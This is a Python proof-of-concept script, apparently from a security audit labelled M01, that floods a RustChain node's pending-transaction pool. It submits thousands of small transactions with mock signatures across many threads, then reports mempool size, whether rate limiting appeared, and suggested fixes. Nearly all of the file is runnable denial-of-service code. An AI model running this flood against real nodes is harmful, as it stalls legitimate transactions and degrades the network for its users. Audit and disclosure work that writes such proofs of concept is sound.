#!/usr/bin/env python3
"""
PoC: Pending Pool DoS via Mass Submissions (M01)
================================================

This PoC demonstrates how an attacker can flood the pending transaction
pool with thousands of low-value transactions, causing:
- Memory exhaustion
- Block production slowdown
- Legitimate transactions stalled

Attack Requirements:
- Attacker has 1000 RTC.
- Creates 10,000 transactions of 0.1 RTC each.
- Each transaction consumes DB space and memory.

Impact:
- Mempool grows unbounded
- Block producer must scan all pending txs
- Network performance degrades

Usage:
    python3 poc_mempool_flood.py --node http://localhost:8088 --wallet RTCxxx --count 10000

Note: This is for authorized testing only.
"""

import argparse
import sys
import time
import threading
import sqlite3
import requests
from typing import List

def get_wallet_balance(node_url: str, wallet: str) -> int:
    """Get current balance via API."""
    try:
        resp = requests.get(f"{node_url}/wallet/{wallet}/balance", timeout=5)
        if resp.ok:
            return resp.json().get("balance_urtc", 0)
    except Exception as e:
        print(f"[!] Error fetching balance: {e}")
    return 0

def create_transaction(from_addr: str, to_addr: str, amount_urtc: int,
                       nonce: int, private_key_hex: str) -> dict:
    """Create a mock signed transaction."""
    import hashlib
    import json
    tx_data = {
        "from_addr": from_addr,
        "to_addr": to_addr,
        "amount_urtc": amount_urtc,
        "nonce": nonce,
        "timestamp": int(time.time() * 1000),
        "memo": "DoS PoC"
    }
    tx_string = json.dumps(tx_data, sort_keys=True)
    tx_hash = hashlib.sha256(tx_string.encode()).hexdigest()
    tx_data["tx_hash"] = tx_hash
    tx_data["signature"] = "MOCK_SIG_" + tx_hash[:32]
    tx_data["public_key"] = "MOCK_PUBKEY"
    return tx_data

def submit_worker(node_url: str, tx: dict, results: List, idx: int):
    """Submit a single transaction."""
    try:
        resp = requests.post(f"{node_url}/tx/submit", json=tx, timeout=5)
        results[idx] = (tx["nonce"], resp.status_code, resp.ok)
    except Exception as e:
        results[idx] = (tx["nonce"], None, False)

def main():
    parser = argparse.ArgumentParser(description="Mempool Flood DoS PoC")
    parser.add_argument("--node", default="http://localhost:8088",
                        help="RustChain node URL")
    parser.add_argument("--wallet", required=True, help="Attacker wallet address")
    parser.add_argument("--private-key", help="Private key (if needed)")
    parser.add_argument("--count", type=int, default=1000,
                        help="Number of transactions to submit")
    parser.add_argument("--amount", type=float, default=0.1,
                        help="Amount per transaction in RTC")
    parser.add_argument("--threads", type=int, default=20,
                        help="Concurrent submission threads")
    args = parser.parse_args()

    print("=" * 70)
    print("Pending Pool DoS PoC — RustChain")
    print("=" * 70)
    print(f"[*] Target node: {args.node}")
    print(f"[*] Attacker wallet: {args.wallet}")
    print(f"[*] Plan: Submit {args.count} transactions of {args.amount} RTC each")
    print(f"[*] Total required balance: {args.count * args.amount} RTC")

    balance_urtc = get_wallet_balance(args.node, args.wallet)
    balance_rtc = balance_urtc / 100_000_000
    print(f"[*] Current balance: {balance_rtc:.2f} RTC")

    if balance_rtc < args.count * args.amount:
        print("[!] WARNING: Insufficient balance for full attack.")
        print(f"[!] Will only submit approximately {int(balance_rtc / args.amount)} transactions")

    to_addr = "RTC" + "y" * 64  # Destination (could be victim)

    # Determine how many transactions we can actually submit (balance limited)
    max_txs = int(balance_rtc / args.amount)
    num_txs = min(args.count, max_txs) if max_txs > 0 else args.count

    print(f"[*] Submitting {num_txs} transactions with {args.threads} threads...")
    print("[*] Starting in 2 seconds...")
    time.sleep(2)

    results = [None] * num_txs
    threads = []
    start = time.time()

    # Distribute transactions across nonces (we need sequential nonces)
    # But we'll just use sequential nonces overall; multiple threads will handle different nonces
    def submit_batch(batch_start, batch_size):
        for i in range(batch_start, batch_start + batch_size):
            nonce = i + 1  # Sequential nonce (real implementation needs to fetch current nonce)
            tx = create_transaction(
                args.wallet, to_addr,
                int(args.amount * 100_000_000),  # Convert to uRTC
                nonce,
                args.private_key or "MOCK_KEY"
            )
            worker_idx = i - batch_start
            t = threading.Thread(target=submit_worker, args=(args.node, tx, results, worker_idx))
            t.start()
            threads.append(t)
            time.sleep(0.001)  # Small stagger to avoid overwhelming local socket

    # Simple batching
    batch_size = max(1, num_txs // args.threads)
    for batch_start in range(0, num_txs, batch_size):
        remaining = num_txs - batch_start
        this_batch = min(batch_size, remaining)
        submit_batch(batch_start, this_batch)

    for t in threads:
        t.join()

    elapsed = time.time() - start
    success_count = sum(1 for r in results if r and r[2])

    print(f"\n[+] Completed in {elapsed:.2f}s")
    print(f"[+] Successful submissions: {success_count}/{num_txs}")
    print(f"[+] Throughput: {success_count / elapsed:.1f} tx/sec")

    # Check mempool size
    try:
        resp = requests.get(f"{args.node}/tx/pending?limit=10000")
        if resp.ok:
            pending_data = resp.json()
            pending_count = pending_data.get("count", 0)
            print(f"\n[*] Pending transactions in mempool: {pending_count}")

            if pending_count > 1000:
                print("[!] VULNERABILITY: Mempool exceeds reasonable size")
            else:
                print("[+] Mempool size seems controlled")
    except Exception as e:
        print(f"[!] Could not query pending: {e}")

    # Check if rate limiting was hit
    rate_limited = sum(1 for r in results if r and r[1] == 429)
    if rate_limited > 0:
        print(f"[+] Rate limiting active: {rate_limited} requests returned 429")
    else:
        print("[!] No rate limiting observed — vulnerable to flooding")

    print("\n" + "=" * 70)
    print("Remediation:")
    print("1. Implement per-address pending limit (e.g., MAX 16 pending txs)")
    print("2. Add rate limiting on /tx/submit endpoint")
    print("3. Reject new txs from address that already has pending limit")
    print("=" * 70)

if __name__ == "__main__":
    main()
